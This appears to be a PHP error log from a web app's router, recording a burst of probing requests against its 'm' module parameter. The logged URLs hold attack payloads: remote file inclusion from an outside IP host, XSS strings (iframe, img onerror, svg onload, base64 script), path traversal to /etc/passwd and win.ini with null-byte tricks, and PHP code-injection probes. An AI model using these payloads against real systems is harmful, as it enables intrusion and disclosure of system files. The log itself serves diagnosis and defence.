<?php
 die();
?>

18:56:40 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http://120.26.55.211/s.txt&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

18:57:03 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http%3A%2F%2F120.26.55.211%2Fs.txt&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

18:57:19 ERROR: the control file module/a_long_name_file_not_exist/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=a_long_name_file_not_exist&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

18:57:55 ERROR: the control file module/bug'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bug'%22%3E%3Ciframe%20onload=alert()%3E&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

18:58:54 ERROR: the control file module/bug'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bug'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

18:59:45 ERROR: the control file module/bug'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bug'%22%3E%3Csvg%20onload=prompt()%3E&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:00:43 ERROR: the control file module/phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:01:16 ERROR: the control file module/amf2yxnjcmlwddpwcm9tchqomtexktt4/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:01:57 ERROR: the control file module/bugi2027381i/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bugi2027381i&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:02:00 ERROR: the control file module//etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%2Fetc%2Fpasswd&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:02:41 ERROR: the control file module/c://windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=c%3A%2F%2Fwindows%2Fwin.ini&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:03:22 ERROR: the control file module/../../../../../../../../etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:04:01 ERROR: the control file module/../../../../../../../../windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:04:36 ERROR: the control file module/../../../../../../../../../../etc/passwd%00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:05:16 ERROR: the control file module/../../../../../../../../../../windows/win.ini00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini00&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:05:59 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:05:59 ERROR: the control file module/../../../../../../../../etc/passwd in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:06:45 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:06:45 ERROR: the control file module/../../../../../../../../windows/win.ini in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:07:23 ERROR: the control file module/../../../../../../../../etc/passwd
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:08:09 ERROR: the control file module/../../../../../../../../windows/win.ini
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%0a.jpg&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:09:28 ERROR: the control file module/${@print(md5(this_is_a_test_string))}/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:10:01 ERROR: the control file module/${@print(md5(this_is_a_test_string))}\/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2

19:10:39 ERROR: the control file module/print(md5(this_is_a_test_string));die();/*/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&f=browse&productID=0&branch=&browseType=unclosed&param=0&orderBy=&recTotal=43&recPerPage=20&pageID=2
